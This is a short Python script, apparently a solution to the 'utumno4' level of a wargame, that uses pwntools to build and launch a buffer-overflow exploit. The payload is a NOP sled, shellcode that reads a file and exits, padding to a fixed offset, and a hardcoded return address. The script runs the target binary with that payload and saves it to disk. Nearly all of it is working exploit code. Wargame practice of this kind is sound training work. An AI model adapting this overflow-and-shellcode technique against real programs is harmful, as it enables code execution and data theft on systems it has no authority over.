#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("./utumno4")

filepath = "./exploit.py"

num = 0x10000

payload = b''
payload = payload.ljust(0x1000, b'\x90')
payload += asm(shellcraft.cat(filepath) + shellcraft.exit(0))
payload = payload.ljust(0xff06, b'A')
payload += p32(0xffffcfc8 - 0xff06 + int(0x1000 / 2))
payload = payload.ljust(num, b'Z')

p = process(argv=[b'./utumno4', str(num), payload])

log.info(p.recv(timeout=1))

with open("payload.b", "wb") as file:
    file.write(payload)
